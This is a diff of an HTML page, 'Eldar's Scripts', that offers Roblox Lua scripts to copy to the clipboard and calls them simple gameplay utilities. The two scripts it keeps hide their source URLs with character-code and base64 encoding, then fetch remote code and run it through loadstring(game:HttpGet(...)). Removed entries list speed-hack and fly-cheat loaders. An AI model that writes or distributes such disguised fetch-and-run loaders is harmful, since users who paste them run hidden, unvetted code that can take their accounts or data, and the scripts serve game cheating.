@@ -5,404 +5,324 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Eldar's Scripts</title>
     
+    <!-- PWA Manifest -->
     <link rel="manifest" href="manifest.json">
-    <meta name="theme-color" content="#F9F9F9"> <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#6200EA">
+    <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
-
-    <link rel="preload" href="https://developer.apple.com/fonts/sf-pro/SF-Pro-Display-Regular.otf" as="font" type="font/otf" crossorigin>
-    <link rel="preload" href="https://developer.apple.com/fonts/sf-pro/SF-Pro-Text-Regular.otf" as="font" type="font/otf" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
+    
     <style>
-        /* CSS Variables for iOS-like Dark/Light Mode & Colors */
         :root {
-            /* Light Mode Colors */
-            --color-bg-primary: #F9F9F9; /* Very light background */
-            --color-bg-secondary: #FFFFFF; /* Card/Container background */
-            --color-text-primary: #000000;
-            --color-text-secondary: #8A8A8E; /* iOS System Gray */
-            --color-accent-blue: #007AFF; /* iOS System Blue */
-            --color-separator: rgba(0, 0, 0, 0.08); /* Subtle separator */
-            --color-shadow-light: rgba(0, 0, 0, 0.05); /* Light shadow for depth */
-            --color-glass-bg: rgba(255, 255, 255, 0.7); /* Glassmorphism background */
-            --color-glass-border: rgba(255, 255, 255, 0.2);
-
-            /* Typography */
-            --font-family-display: 'SF Pro Display', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
-            --font-family-text: 'SF Pro Text', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
+            --text: #FFFFFF;
+            --bg: #6200EA;
+            --border: rgba(255, 255, 255, 0.2);
+            --button-bg: #7C4DFF;
+            --button-text: #FFFFFF;
+            --search-bg: rgba(255, 255, 255, 0.1);
+            --search-border: rgba(255, 255, 255, 0.3);
+            --notification-bg: rgba(98, 0, 234, 0.9);
+            --glow: 0 0 8px rgba(124, 77, 255, 0.5);
         }
 
-        /* Dark Mode Colors */
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --color-bg-primary: #1C1C1E; /* iOS Dark Background */
-                --color-bg-secondary: #2C2C2E; /* iOS Dark Card/Container */
-                --color-text-primary: #FFFFFF;
-                --color-text-secondary: #EBEBF599; /* iOS System Gray in Dark */
-                --color-accent-blue: #0A84FF; /* iOS System Blue in Dark */
-                --color-separator: rgba(255, 255, 255, 0.15);
-                --color-shadow-light: rgba(0, 0, 0, 0.3);
-                --color-glass-bg: rgba(44, 44, 46, 0.7);
-                --color-glass-border: rgba(255, 255, 255, 0.1);
-            }
-        }
-
-        /* Base Styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent; /* Remove tap highlight on iOS */
+            font-family: -apple-system, SF Pro, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
         body {
-            font-family: var(--font-family-text);
-            background-color: var(--color-bg-primary);
-            color: var(--color-text-primary);
+            background-color: var(--bg);
+            color: var(--text);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* Respect safe area insets for notched devices */
-            padding-top: env(safe-area-inset-top);
-            padding-bottom: env(safe-area-inset-bottom);
-            overflow-x: hidden; /* Prevent horizontal scroll */
-            transition: background-color 0.3s ease; /* Smooth dark mode transition */
+            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+            overflow-x: hidden;
         }
 
         .container {
             width: 100%;
-            max-width: 768px; /* Max width for content on larger screens/iPad */
-            padding: 0 16px; /* Default horizontal padding */
+            max-width: 600px;
+            padding: 0 16px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            flex-grow: 1; /* Allow content to push footer down */
         }
 
-        /* Navigation Bar (Mimicking iOS NavBar) */
-        .navigation-bar {
-            width: 100%;
-            background-color: var(--color-bg-secondary);
-            border-bottom: 0.5px solid var(--color-separator);
-            padding: 12px 16px; /* Adjusted padding */
+        header {
             text-align: center;
-            box-shadow: 0 0.5px 0 var(--color-shadow-light); /* Very subtle bottom shadow */
-            position: sticky;
+            padding: 44px 0 24px;
+            width: 100%;
+        }
+
+        .logo {
+            font-size: 34px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 8px;
+            text-shadow: var(--glow);
+        }
+
+        .subtitle {
+            font-size: 17px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 16px;
+        }
+
+        /* Cosmic Background with Glow */
+        .cosmic-bg {
+            position: fixed;
             top: 0;
-            z-index: 100;
-            transition: background-color 0.3s ease, border-color 0.3s ease;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+            background: linear-gradient(180deg, #6200EA 0%, #311B92 100%);
         }
 
-        .navigation-bar h1 {
-            font-family: var(--font-family-display);
-            font-size: 17px; /* iOS standard for nav bar titles */
-            font-weight: 600; /* Semibold */
-            color: var(--color-text-primary);
-            margin: 0;
+        .star {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            width: 2px;
+            height: 2px;
+            box-shadow: 0 0 6px rgba(255, 255, 255, 0.6);
+            animation: twinkle 2s infinite ease-in-out alternate;
         }
 
-        /* Search Container & Field (Modern iOS look) */
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.4; transform: scale(1); }
+            50% { opacity: 0.9; transform: scale(1.2); }
+        }
+
+        /* Search Bar */
         .search-container {
             width: 100%;
-            padding: 10px 16px; /* Consistent padding with container */
-            background-color: var(--color-bg-primary); /* Blend with body background */
-            position: sticky;
-            top: calc(48px + env(safe-area-inset-top)); /* Adjust based on nav bar height + safe area */
-            z-index: 99;
-            transition: background-color 0.3s ease;
+            margin-bottom: 24px;
         }
 
-        .search-field {
+        .search-box {
             width: 100%;
-            padding: 10px 15px 10px 35px; /* Left padding for icon */
+            padding: 10px 16px;
             border-radius: 10px;
-            border: 0.5px solid var(--color-separator);
-            background-color: var(--color-bg-secondary);
-            color: var(--color-text-primary);
-            font-family: var(--font-family-text);
+            border: 1px solid var(--search-border);
+            background: var(--search-bg);
+            color: var(--text);
             font-size: 17px;
-            -webkit-appearance: none; /* Remove default Safari styles */
-            appearance: none;
-            box-sizing: border-box;
+            box-shadow: var(--glow);
             transition: all 0.2s ease;
-            position: relative;
-        }
-        
-        .search-field-wrapper {
-            position: relative;
         }
 
-        .search-field-wrapper::before {
-            content: '🔍'; /* Search icon */
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--color-text-secondary);
-            font-size: 14px;
-        }
-
-        .search-field::placeholder {
-            color: var(--color-text-secondary);
-            opacity: 1; /* Ensure consistent placeholder color */
-        }
-
-        .search-field:focus {
+        .search-box:focus {
             outline: none;
-            border-color: var(--color-accent-blue);
-            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.2); /* Subtle blue glow */
+            border-color: #BB86FC;
+            box-shadow: 0 0 10px rgba(124, 77, 255, 0.7);
         }
 
         .search-results {
-            margin-top: 8px; /* Closer to search field */
-            background-color: var(--color-bg-secondary);
+            margin-top: 8px;
+            background: var(--notification-bg);
             border-radius: 10px;
-            overflow: hidden;
-            display: none; /* Controlled by JS */
-            border: 0.5px solid var(--color-separator);
-            box-shadow: 0 2px 10px var(--color-shadow-light); /* More pronounced shadow */
-            max-height: 250px; /* Limit height for scroll */
+            padding: 8px;
+            max-height: 300px;
             overflow-y: auto;
-            -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
+            display: none;
+            border: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+            box-shadow: var(--glow);
         }
 
-        .search-results .script-item {
-            padding: 12px 16px;
-            border-bottom: 0.5px solid var(--color-separator);
+        .script-item {
+            padding: 12px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.2s ease;
+            transition: background 0.2s ease;
         }
 
-        .search-results .script-item:last-child {
-            border-bottom: none;
+        .script-item:hover {
+            background: rgba(255, 255, 255, 0.1);
         }
 
-        .search-results .script-item:active {
-            background-color: rgba(0, 0, 0, 0.03); /* Subtle tap feedback */
-        }
-        @media (prefers-color-scheme: dark) {
-             .search-results .script-item:active {
-                background-color: rgba(255, 255, 255, 0.05);
-            }
+        .button-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            width: 100%;
         }
 
-
-        .search-results .script-item strong {
-            display: block;
-            font-family: var(--font-family-text);
+        .script-btn {
+            background: var(--button-bg);
+            border: none;
+            color: var(--button-text);
+            padding: 16px;
+            border-radius: 10px;
             font-size: 17px;
-            font-weight: 500; /* Medium weight */
-            margin-bottom: 2px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            box-shadow: var(--glow);
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .search-results .script-item p {
-            font-family: var(--font-family-text);
+        .script-btn:hover {
+            background: #BB86FC;
+            box-shadow: 0 0 12px rgba(124, 77, 255, 0.7);
+        }
+
+        .script-btn:active {
+            background: #3700B3;
+            transform: scale(0.98);
+        }
+
+        .info-text {
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 24px;
+            text-align: center;
             font-size: 15px;
-            color: var(--color-text-secondary);
-            margin: 0;
             line-height: 1.4;
         }
 
-        /* Button Grid (Modern Grid Layout) */
-        .button-grid {
-            width: 100%;
-            display: grid;
-            grid-template-columns: 1fr; /* Default: one column */
-            gap: 12px;
-            padding: 20px 16px; /* Consistent padding */
-        }
-
-        .script-button {
-            background-color: var(--color-bg-secondary);
-            border: 0.5px solid var(--color-separator);
-            color: var(--color-text-primary);
-            padding: 16px 20px;
-            border-radius: 12px; /* Slightly more rounded corners for buttons */
-            font-family: var(--font-family-display);
-            font-size: 18px; /* Slightly larger for main actions */
-            font-weight: 600; /* Semibold */
-            cursor: pointer;
-            transition: background-color 0.2s ease, transform 0.1s ease, box-shadow 0.2s ease;
-            text-align: center;
-            -webkit-appearance: none;
-            appearance: none;
-            box-shadow: 0 1px 3px var(--color-shadow-light); /* Soft shadow */
-            display: flex; /* Centering text vertically if icon is added */
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            overflow: hidden; /* For pseudo-elements */
-        }
-
-        /* Subtle gradient overlay for modern pop */
-        .script-button::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: radial-gradient(circle at top left, rgba(255,255,255,0.05) 0%, transparent 70%);
-            pointer-events: none;
-            border-radius: inherit;
-        }
-
-        .script-button:active {
-            background-color: rgba(0, 0, 0, 0.05); /* Darker on press */
-            transform: scale(0.98); /* Slight press effect */
-            box-shadow: none; /* Remove shadow on press */
-        }
-         @media (prefers-color-scheme: dark) {
-             .script-button:active {
-                background-color: rgba(255, 255, 255, 0.05);
-            }
-        }
-
-
-        /* Info Text */
-        .info-text {
-            color: var(--color-text-secondary);
-            margin-top: 30px;
-            text-align: center;
-            line-height: 1.5;
-            font-size: 15px;
-            padding: 0 16px; /* Consistent padding */
-            max-width: 500px; /* Readability constraint */
-        }
-
-        .info-text .highlight {
-            color: var(--color-accent-blue); /* iOS system blue for highlights */
-            font-weight: 500;
-            /* Removed all previous custom background/shadows for highlight */
-        }
-
         .coming-soon {
-            color: var(--color-text-secondary);
-            margin-top: 15px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 16px;
+            font-size: 15px;
             font-style: italic;
             text-align: center;
-            font-size: 15px;
         }
 
-        /* Footer (More iOS-like, subtle and informative) */
+        .highlight {
+            font-weight: 600;
+            color: #BB86FC;
+            text-shadow: 0 0 4px rgba(124, 77, 255, 0.5);
+        }
+
         footer {
-            margin-top: auto; /* Pushes footer to the bottom */
-            padding: 20px 16px env(safe-area-inset-bottom, 20px) 16px; /* Respect safe area bottom */
+            margin-top: auto;
+            padding: 20px 0;
             text-align: center;
-            color: var(--color-text-secondary);
-            font-size: 13px; /* Smaller, subtle text */
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
             width: 100%;
-            background-color: var(--color-bg-primary); /* Blends with body */
-            border-top: 0.5px solid var(--color-separator);
-            transition: background-color 0.3s ease, border-color 0.3s ease;
+            background: rgba(98, 0, 234, 0.8);
+            border-top: 1px solid var(--border);
+            backdrop-filter: blur(10px);
         }
 
         .footer-logo {
-            font-weight: 600;
-            color: var(--color-text-primary); /* Use primary text color, not rainbow */
-            /* Removed all previous custom background/shadows for footer logo */
+            font-weight: 700;
+            color: #BB86FC;
+            text-shadow: 0 0 4px rgba(124, 77, 255, 0.5);
         }
 
-        /* Notification System (iOS Banner/Toast style with Glassmorphism) */
+        /* Notification System */
         .notification-container {
             position: fixed;
-            top: calc(60px + env(safe-area-inset-top)); /* Below nav bar + safe area */
-            left: 50%;
-            transform: translateX(-50%);
+            top: env(safe-area-inset-top, 20px);
+            right: 16px;
+            left: 16px;
             z-index: 1000;
             display: flex;
             flex-direction: column;
-            gap: 10px;
-            width: 90%;
-            max-width: 350px;
-            pointer-events: none; /* Allow clicks through unless notification is active */
+            gap: 8px;
         }
 
         .notification {
-            background-color: var(--color-glass-bg); /* Glassmorphism effect */
-            backdrop-filter: blur(20px) saturate(180%); /* Stronger blur for iOS feel */
-            -webkit-backdrop-filter: blur(20px) saturate(180%);
-            color: var(--color-text-primary);
-            padding: 12px 18px;
-            border-radius: 12px; /* Consistent rounded corners */
-            box-shadow: 0 5px 15px var(--color-shadow-light); /* Elevated shadow */
-            border: 1px solid var(--color-glass-border); /* Subtle border for glass effect */
+            background: var(--notification-bg);
+            backdrop-filter: blur(10px);
+            color: var(--text);
+            padding: 12px 16px;
+            border-radius: 10px;
+            box-shadow: var(--glow);
+            border: 1px solid var(--border);
             display: flex;
             align-items: center;
-            gap: 10px;
-            transform: translateY(-80px); /* Start off-screen */
+            gap: 8px;
+            transform: translateY(-20px);
             opacity: 0;
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s ease; /* Springy entrance */
-            pointer-events: auto; /* Re-enable pointer events when visible */
+            animation: slideIn 0.3s ease-out forwards;
         }
 
         .notification.success {
-            border-left: 4px solid #34C759; /* iOS System Green */
+            border-left: 4px solid #00FF00;
         }
 
         .notification.error {
-            border-left: 4px solid #FF3B30; /* iOS System Red */
-        }
-
-        .notification.show {
-            transform: translateY(0);
-            opacity: 1;
+            border-left: 4px solid #FF3B30;
         }
 
         .notification.exiting {
-            transform: translateY(-80px); /* Exit upwards */
-            opacity: 0;
-            transition: transform 0.3s ease-in, opacity 0.2s ease-in; /* Faster exit */
+            animation: slideOut 0.3s ease-out forwards;
         }
 
-        .notification span:first-child { /* Icon */
-            font-size: 18px;
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
-        .notification span:last-child { /* Text */
-            font-family: var(--font-family-text);
-            font-size: 15px;
-            font-weight: 500;
+        @keyframes slideOut {
+            from { transform: translateY(0); opacity: 1; }
+            to { transform: translateY(-20px); opacity: 0; }
         }
-        
-        /* Responsive Adjustments */
-        @media (min-width: 768px) {
-            .button-grid {
-                grid-template-columns: repeat(2, 1fr); /* Two columns on larger screens */
-                gap: 16px; /* Slightly larger gap */
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 414px) {
+            header {
+                padding: 32px 0 16px;
             }
-        }
-        @media (min-width: 1024px) {
-            .button-grid {
-                grid-template-columns: repeat(3, 1fr); /* Three columns on very large screens */
+            
+            .logo {
+                font-size: 28px;
+            }
+            
+            .subtitle {
+                font-size: 15px;
+            }
+            
+            .script-btn {
+                padding: 14px;
+                font-size: 16px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="navigation-bar">
-        <h1>Eldar's Scripts</h1>
-    </div>
-
+    <div class="cosmic-bg" id="cosmicBg"></div>
     <div class="notification-container" id="notificationContainer"></div>
     
     <div class="container">
+        <header>
+            <h1 class="logo">Eldar's Scripts</h1>
+            <p class="subtitle">Simple Roblox utilities for fun gameplay</p>
+        </header>
+
         <div class="search-container">
-            <div class="search-field-wrapper">
-                <input type="text" class="search-field" id="searchBox" placeholder="Search scripts...">
-            </div>
+            <input type="text" class="search-box" id="searchBox" placeholder="Search scripts...">
             <div class="search-results" id="searchResults"></div>
         </div>
 
         <div class="button-grid">
-            <button class="script-button" data-script-name="Anvil Voider 2.0" data-script-content='local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'>
+            <button class="script-btn" data-script-name="AnvilVoider" data-script-content='local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'>
                 Anvil Voider 2.0
             </button>
-            <button class="script-button" data-script-name="Power Script 1.2" data-script-content='local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))d(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'>
+            <button class="script-btn" data-script-name="Power Script" data-script-content='local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))end;loadstring(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'>
                 Power Script 1.2
             </button>
-            </div>
+        </div>
 
         <p class="coming-soon">More utilities coming soon...</p>
 
@@ -416,54 +336,44 @@
     </footer>
 
     <script>
-        // Script database for AI search
+        // Script database for search
         const scriptDatabase = [
             { 
                 name: "Anvil Voider 2.0", 
-                description: "Special utility script for Anvil.", 
-                keywords: ["anvil", "void", "utility", "protection", "anti-fall"], 
+                description: "Special utility script", 
+                keywords: ["anvil", "void", "utility", "protection"], 
                 code: 'local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'
             },
-            {
-                name: "Power Script 1.2",
-                description: "An all-purpose script with various powerful features and commands.",
-                keywords: ["power", "universal", "admin", "exploits", "commands"],
-                code: 'local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))d(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'
-            },
-            {
-                name: "Speed Hack (Experimental)",
-                description: "An experimental script to increase character speed.",
-                keywords: ["speed", "hack", "experimental", "movement"],
-                code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/username/scripts/main/speedhack.lua"))()'
-            },
-            {
-                name: "Fly Script (Beta)",
-                description: "Allows basic flying capabilities within compatible games.",
-                keywords: ["fly", "beta", "movement", "air"],
-                code: 'loadstring(game:HttpGet("https://raw.githubusercontent.com/username/scripts/main/flyscript.lua"))()'
-            },
-            // Add more scripts to your database here
+            { 
+                name: "Power Script 1.2", 
+                description: "Enhanced gameplay utility", 
+                keywords: ["power", "script", "utility", "enhancement"], 
+                code: 'local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))end;loadstring(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'
+            }
         ];
 
-        // Notification system (iOS Banner/Toast style with Glassmorphism)
+        // Cosmic Background
+        function createCosmicBackground() {
+            const cosmicBg = document.getElementById('cosmicBg');
+            cosmicBg.innerHTML = '';
+            for (let i = 0; i < 50; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = `${Math.random() * 100}vw`;
+                star.style.top = `${Math.random() * 100}vh`;
+                star.style.animationDelay = `${Math.random() * 2}s`;
+                cosmicBg.appendChild(star);
+            }
+        }
+
+        // Notification System
         function showNotification(message, type = 'success') {
             const container = document.getElementById('notificationContainer');
-            
-            // Remove existing notifications with animation
-            const existingNotifications = container.querySelectorAll('.notification.show');
-            existingNotifications.forEach(notification => {
-                notification.classList.remove('show');
-                notification.classList.add('exiting');
-                setTimeout(() => notification.remove(), 400); // Wait for transition
-            });
-            
-            // Create new notification
             const notification = document.createElement('div');
             notification.className = `notification ${type}`;
             
             const icon = document.createElement('span');
-            // Using emojis for now. For a true native feel, consider SF Symbols via a font or SVG.
-            icon.textContent = type === 'success' ? '✅' : '❌'; 
+            icon.textContent = type === 'success' ? '✅' : '❌';
             
             const text = document.createElement('span');
             text.textContent = message;
@@ -472,28 +382,21 @@
             notification.appendChild(text);
             container.appendChild(notification);
             
-            // Show notification with a slight delay to trigger springy animation
             setTimeout(() => {
-                notification.classList.add('show');
-            }, 50); 
-            
-            // Auto-remove after 3 seconds
-            setTimeout(() => {
-                notification.classList.remove('show');
                 notification.classList.add('exiting');
-                setTimeout(() => notification.remove(), 400); // Remove after exit animation
+                setTimeout(() => notification.remove(), 300);
             }, 3000);
         }
 
-        // AI Search Functionality
+        // Search Functionality
         function setupSearch() {
             const searchBox = document.getElementById('searchBox');
             const searchResults = document.getElementById('searchResults');
             
             searchBox.addEventListener('input', function() {
-                const query = this.value.toLowerCase().trim();
+                const query = this.value.toLowerCase();
                 
-                if (query.length < 2) { // Require at least 2 characters to start searching
+                if (query.length < 2) {
                     searchResults.style.display = 'none';
                     return;
                 }
@@ -504,8 +407,8 @@
                            script.keywords.some(kw => kw.toLowerCase().includes(query));
                 });
                 
-                searchResults.innerHTML = ''; // Clear previous results
                 if (results.length > 0) {
+                    searchResults.innerHTML = '';
                     results.forEach(script => {
                         const item = document.createElement('div');
                         item.className = 'script-item';
@@ -514,20 +417,19 @@
                             <p>${script.description}</p>
                         `;
                         item.addEventListener('click', () => {
-                            copyScript(null, script.name, script.code); // Pass name and code directly
-                            searchBox.value = ''; // Clear search box
-                            searchResults.style.display = 'none'; // Hide results
+                            copyScript(item, script.name, script.code);
+                            searchBox.value = '';
+                            searchResults.style.display = 'none';
                         });
                         searchResults.appendChild(item);
                     });
                     searchResults.style.display = 'block';
                 } else {
-                    searchResults.innerHTML = '<div class="script-item" style="color: var(--color-text-secondary); text-align: center;">No matching scripts found.</div>';
+                    searchResults.innerHTML = '<div class="script-item">No scripts found. Try different keywords.</div>';
                     searchResults.style.display = 'block';
                 }
             });
             
-            // Hide results when clicking outside search area
             document.addEventListener('click', function(e) {
                 if (!searchBox.contains(e.target) && !searchResults.contains(e.target)) {
                     searchResults.style.display = 'none';
@@ -535,32 +437,48 @@
             });
         }
 
-        // Copy script to clipboard
-        function copyScript(buttonElement, name, content) {
-            // If buttonElement is provided (from a direct button click), we can give visual feedback on the button itself.
-            // If it's null (from search result click), we just perform the copy.
+        // Copy Script to Clipboard
+        function copyScript(element, name, content) {
+            if (!content) {
+                name = element.getAttribute('data-script-name');
+                content = element.getAttribute('data-script-content');
+            }
+            
+            const originalHTML = element.innerHTML;
+            element.innerHTML = `${name}`;
+            element.style.background = '#3700B3';
+            element.style.boxShadow = 'none';
             
             navigator.clipboard.writeText(content)
                 .then(() => {
-                    showNotification(`${name} copied!`);
+                    showNotification(`${name} copied to clipboard!`, 'success');
                 })
                 .catch(err => {
                     console.error('Failed to copy: ', err);
                     showNotification(`Failed to copy ${name}`, 'error');
+                })
+                .finally(() => {
+                    setTimeout(() => {
+                        element.innerHTML = originalHTML;
+                        element.style.background = '';
+                        element.style.boxShadow = '';
+                    }, 1000);
                 });
         }
 
-        // Initialize effects
+        // Initialize
         window.addEventListener('DOMContentLoaded', () => {
+            createCosmicBackground();
             setupSearch();
             
-            // Add click handlers to all script buttons
-            document.querySelectorAll('.script-button').forEach(button => {
-                button.addEventListener('click', () => copyScript(button, button.dataset.scriptName, button.dataset.scriptContent));
+            document.querySelectorAll('.script-btn').forEach(button => {
+                button.addEventListener('click', () => copyScript(button));
             });
+            
+            window.addEventListener('resize', createCosmicBackground);
         });
 
-        // PWA Service Worker Registration
+        // PWA Service Worker
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('sw.js')
                 .then(reg => console.log('Service Worker registered:', reg))
